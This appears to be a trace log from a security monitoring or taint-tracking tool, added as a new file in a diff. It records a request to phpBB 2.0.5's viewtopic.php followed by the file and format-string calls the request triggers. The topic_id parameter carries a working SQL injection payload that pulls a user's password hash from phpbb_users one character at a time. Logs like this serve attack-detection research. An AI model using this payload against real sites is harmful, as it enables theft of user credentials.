@@ -1,0 +1,38 @@
+in GET 1     139 /phpBB2-2.0.5/viewtopic.php?sid=1&topic_id=-1 union select ord(substring(user_password,1,1)) from phpbb_users where user_id=3/*&view=newest
+in parameter 2       3       1 sid 1
+in parameter 2       8      84 topic_id -1 union select ord(substring(user_password,1,1)) from phpbb_users where user_id=3/*
+in parameter 2       4       6 view newest
+out fopen 1      40 /var/www/html/phpBB2-2.0.5/viewtopic.php
+out realpath 1      40 /var/www/html/phpBB2-2.0.5/viewtopic.php
+out fopen 1      15 ./extension.inc
+out realpath 1      42 /var/www/html/phpBB2-2.0.5/./extension.inc
+out fopen 1      12 ./common.php
+out realpath 1      39 /var/www/html/phpBB2-2.0.5/./common.php
+out fopen 1      12 ./config.php
+out realpath 1      39 /var/www/html/phpBB2-2.0.5/./config.php
+out fopen 1      24 ./includes/constants.php
+out realpath 1      51 /var/www/html/phpBB2-2.0.5/./includes/constants.php
+out fopen 1      23 ./includes/template.php
+out realpath 1      50 /var/www/html/phpBB2-2.0.5/./includes/template.php
+out sprintf 1       2 %d
+out sprintf 1       8 %c%s%s%s
+out fopen 1      23 ./includes/sessions.php
+out realpath 1      50 /var/www/html/phpBB2-2.0.5/./includes/sessions.php
+out sprintf 1       2 %d
+out sprintf 1       8 %c%s%s%s
+out sprintf 1       2 %d
+out sprintf 1       8 %c%s%s%s
+out sprintf 1       2 %d
+out sprintf 1       8 %c%s%s%s
+out sprintf 1       2 %d
+out sprintf 1       8 %c%s%s%s
+out fopen 1      19 ./includes/auth.php
+out realpath 1      46 /var/www/html/phpBB2-2.0.5/./includes/auth.php
+out sprintf 1       2 %d
+out sprintf 1       8 %c%s%s%s
+out sprintf 1       2 %d
+out sprintf 1       8 %c%s%s%s
+out fopen 1      24 ./includes/functions.php
+out realpath 1      51 /var/www/html/phpBB2-2.0.5/./includes/functions.php
+out sprintf 1       2 %d
+out sprintf 1       8 %c%s%s%s
